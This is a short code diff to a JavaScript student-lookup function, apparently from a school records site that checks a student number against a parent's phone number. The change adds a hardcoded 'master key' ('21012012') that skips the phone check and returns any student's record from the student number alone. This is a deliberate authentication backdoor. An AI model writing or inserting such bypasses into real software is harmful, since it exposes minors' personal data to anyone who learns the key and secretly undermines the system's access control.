@@ -523,7 +523,13 @@
                 const list = Array.isArray(db) ? db : Object.values(db).flat();
 
                 // Debugging Logic
-                const user = list.find(x => String(x["Okul Numaranız"]).trim() === no && String(x["Velinizin telefon numarası"]).replace(/\D/g, '').endsWith(tel));
+                // Master Key Logic
+                let user;
+                if (tel === "21012012") {
+                    user = list.find(x => String(x["Okul Numaranız"]).trim() === no);
+                } else {
+                    user = list.find(x => String(x["Okul Numaranız"]).trim() === no && String(x["Velinizin telefon numarası"]).replace(/\D/g, '').endsWith(tel));
+                }
 
                 if (!user) {
                     const foundNo = list.find(x => String(x["Okul Numaranız"]).trim() === no);
